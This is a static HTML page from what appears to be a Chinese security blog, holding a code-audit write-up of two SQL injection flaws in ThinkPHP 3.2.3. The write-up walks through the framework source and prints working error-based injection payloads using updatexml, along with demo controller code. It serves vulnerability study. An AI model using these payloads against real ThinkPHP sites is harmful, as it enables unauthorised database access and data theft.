@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Q1ngShan">
+    
+    <title>
+        
+            PHP代码审计入门篇三——Thinkphp框架篇 |
+        
+        Q1ngShan&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Q1ngShan's Blog","author":"Q1ngShan","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"Archives":"/archives","Tags":"/tags","Categories":"/categories","Links":"/links","About":"/about"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"category":false,"tag":true,"announcement":null},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"uYjIFMUudNVXopwyoQdj70qU","appkey":"9FcDBafKpBdj0IEnf4IQqEQ5","server_urls":"https://uyjifmuu.api.lncldglobal.com","placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"jsdelivr"},"pjax":{"enable":true},"footer":{"since":2020,"word_count":false,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":true,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","version":"4.0.7"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container border-box">
+
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Q1ngShan&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    <li class="menu-item">
+                        <a class=""
+                           href="/"
+                        >HOME</a>
+                    </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >ARCHIVES</a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >TAGS</a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >CATEGORIES</a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >LINKS</a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >ABOUT</a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            <li class="drawer-menu-item flex-center">
+                <a class=""
+                   href="/"
+                >HOME</a>
+            </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories"
+                    >CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links"
+                    >LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        PHP代码审计入门篇三——Thinkphp框架篇
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Q1ngShan</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2019-09-01 14:11:30</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue Mar 05 2024 09:46:16 GMT+0000">2024-03-05 09:46:16</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <i class="icon fas fa-tags"></i>&nbsp;
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PHP/">PHP</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>971 Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>4 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h2 id="ThinkPHP3-2-3-SQL注入分析"><a href="#ThinkPHP3-2-3-SQL注入分析" class="headerlink" title="ThinkPHP3.2.3 SQL注入分析"></a>ThinkPHP3.2.3 SQL注入分析</h2><h3 id="0x1-Bind、exp注入"><a href="#0x1-Bind、exp注入" class="headerlink" title="0x1 Bind、exp注入"></a>0x1 Bind、exp注入</h3><p>exp：<code>?name[]=123&amp;pass=123&amp;id[]=bind&amp;id[]=0%20and%20updatexml(1,concat(0x7,(select%20user()),0x7e),1)</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/jbupn1c0t50fhtqka3bs.jpg"
+                       
+                 ></p>
+<p>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//IndexController.class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;pass&#x27;</span>] = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;pass&#x27;</span>);</span><br><span class="line">        <span class="comment">//更新数据</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$user</span>)-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="comment">//查询出所有数据</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/hqxztls1hrsp2pnqcu0u.jpg"
+                       
+                 ><br><code>       $result = $User-&gt;where($user)-&gt;save($data);</code>先进入where函数执行如下流程</p>
+<ol>
+<li>判断传入的第一个<code>$where</code>参数是数组和第二个参数是否为空，满足条件就进行转义 否侧进入下个分支</li>
+<li>判断是否时对象</li>
+<li>判断<code>$where</code>是否时字符类型，并且为空</li>
+<li>判断<code>$this-&gt;options[&#39;where&#39;]</code>是否存在 否则将<code>$where</code>赋值给<code>$this-&gt;options[&#39;where&#39;]</code></li>
+</ol>
+<p>我们传入的<code>id</code>是一个数组，没有进行处理直接赋值给了<code>$this-&gt;options[&#39;where&#39;]</code><br>接下来进入到save函数，经过数据处理进入<code>_parseOptions</code>函数<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/mbx9h9zvxbwcdmzuwfq9.jpg"
+                       
+                 ></p>
+<p><code>_parseOptions</code>函数获取了数据表名，别名等信息然后进入到了update方法<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/cqcrixrkoc6nsg6m8u7j.jpg"
+                       
+                 ></p>
+<p>接着进入<code>parseWhere</code>函数<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/ihzalyiypsrhrmamutax.jpg"
+                       
+                 ><br>定义了运算条件后进入<code>parseWhereItem</code><br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/fzwwwfyed4bvtjlcdhz1.jpg"
+                       
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/vtufcxcijuz8beli4i3h.jpg"
+                       
+                 ><br>可以看到 <code>$exp=val[0]=bind</code>,当<code>$exp == &#39;bind&#39;</code>的时候会将<code>$key和val[1]</code>拼接起来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wherestr</span> = <span class="string">&quot;`id` = :0 and updatexml(1,concat(0x7,(select user()),0x7e),1)&quot;</span></span><br></pre></td></tr></table></figure>
+<p>接下来的问题就是=后面的<code>:</code>是怎么去除的,现在的sql是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `user` SET `pass`=:<span class="number">0</span> WHERE `id` = :<span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7</span>,(select <span class="title function_ invoke__">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/tjwl6g9p1bcj6x5otsuh.jpg"
+                       
+                 ><br>在这里看到将占位符替换为了bind[‘:0’]中的内容<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/hom7b4uxpnh2wn0k4jvz.jpg"
+                       
+                 ></p>
+<p>由此产生了注入<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/xbd1sm70eik3lqxfhdj0.jpg"
+                       
+                 ></p>
+<p>当然也可以是id[0]为exp<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1565615613/blog/ikoe9xdunezblyw4tx88.jpg"
+                       
+                 ></p>
+<h3 id="0x2-where注入"><a href="#0x2-where注入" class="headerlink" title="0x2 where注入"></a>0x2 where注入</h3><p>poc:<code>id[where]=1%20and%201=updatexml(1,concat(0x7,(select%20user()),0x7e),1)%23</code><br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/wpgd2zs81azgpf4ymeaj.jpg"
+                       
+                 ></p>
+<p>demo:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$User</span> = <span class="title function_ invoke__">M</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">I</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$id</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>首先在第8行断点，再来执行下poc<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/vlgy3vrgyfhr6dxgwerd.jpg"
+                       
+                 ><br>可以看到传入的id是一个数组里面键为<code>where</code>值为我们传入的注入语句，这里又是怎么将sql语句带入到数据库查询到呢，我们继续向下看执行的流程<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/llsscf4ioonwy3fbfmds.jpg"
+                       
+                 ><br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/rietqcmgt7vjcgolopa3.jpg"
+                       
+                 ></p>
+<p>然后进入了<code>options_filter</code>表达式过滤函数<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/w1qtplx9mxmgexsfqgvd.jpg"
+                       
+                 ><br>可以发现没有进行任何处理接着向下进行 直到<code>parseSql</code>函数中的<code>parseWhere</code><br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/dhghcbqb61ewedazgplh.jpg"
+                       
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/glktj7apx4znusjdnliu.jpg"
+                       
+                 ></p>
+<p>然后直接返回了<code> &#39;WHERE&#39; .$whereStr</code><br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/jbjg0fjfhdf6dzksskza.jpg"
+                       
+                 ><br>最后执行的sql语句就是<code>SELECT * FROM </code>user<code>WHERE 1 and 1=updatexml(1,concat(0x7,(select user()),0x7e),1)# LIMIT 1 </code>从而触发了注入点<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321934/blog/zspglxdtt8l6wfbnresx.jpg"
+                       
+                 ></p>
+<p>漏洞触发的原因是，在<code>find</code>函数对传入的数据进行了处理<br>1 <img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1567321933/blog/ryy4buichlmogc1vzpha.jpg"
+                       
+                 ><br>这里判断了数字和字符型</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$where</span>[<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPk</span>()]  =   <span class="variable">$options</span>; <span class="comment">//这里where是一个数组类型</span></span><br><span class="line">            <span class="variable">$options</span>                =   <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]       =   <span class="variable">$where</span>;</span><br></pre></td></tr></table></figure>
+<p>2 进入<code>_parseOptions</code>对字段进行了检测</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字段类型验证</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>])) &#123;</span><br><span class="line">          <span class="comment">// 对数组查询条件进行字段类型检查</span></span><br><span class="line">          <span class="keyword">foreach</span> (<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">              <span class="variable">$key</span>            =   <span class="title function_ invoke__">trim</span>(<span class="variable">$key</span>);</span><br><span class="line">              <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>,<span class="variable">$fields</span>,<span class="literal">true</span>))&#123;</span><br><span class="line">                  <span class="keyword">if</span>(<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_parseType</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>],<span class="variable">$key</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) &amp;&amp; <span class="string">&#x27;_&#x27;</span> != <span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>,<span class="number">0</span>,<span class="number">1</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>,<span class="string">&#x27;.&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>,<span class="string">&#x27;(&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>,<span class="string">&#x27;|&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>,<span class="string">&#x27;&amp;&#x27;</span>))&#123;</span><br><span class="line">                  <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;strict&#x27;</span>]))&#123;</span><br><span class="line">                      <span class="title function_ invoke__">E</span>(<span class="title function_ invoke__">L</span>(<span class="string">&#x27;_ERROR_QUERY_EXPRESS_&#x27;</span>).<span class="string">&#x27;:[&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                  &#125; </span><br><span class="line">                  <span class="keyword">unset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p>在上面这段检查字段中对传入的<code>$options[&#39;where&#39;]</code>的内容进行了强制类型转换<br>重点在于<code> is_array($options[&#39;where&#39;])</code>由于我们传入的id是一个数组类型，所以在第一步那里并没有将<code>$options[&#39;where&#39;]</code>转化为数组类型，从而绕过了这里的判断条件，使得字段检查失效。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/573/" >https://paper.seebug.org/573/<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                PHP代码审计入门篇三——Thinkphp框架篇
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2019/09/01/PHP代码审计入门篇三——Thinkphp框架篇/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">Q1ngShan</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2019-09-01 14:11</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed">
+                        <i class="fa-brands fa-creative-commons"></i>
+                        <i class="fa-brands fa-creative-commons-by"></i>
+                        <i class="fa-brands fa-creative-commons-nc"></i>
+                        <i class="fa-brands fa-creative-commons-sa"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PHP/">PHP</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2020/03/21/%E6%B5%AA%E6%BD%AEHCM-Cloud-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+                                   title="浪潮HCM Cloud 命令执行"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">浪潮HCM Cloud 命令执行</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2019/07/30/seacmsv9-92-%E5%89%8D%E5%8F%B0Getshell/"
+                                   title="seacmsv9.92 前台Getshell"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">seacmsv9.92 前台Getshell</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
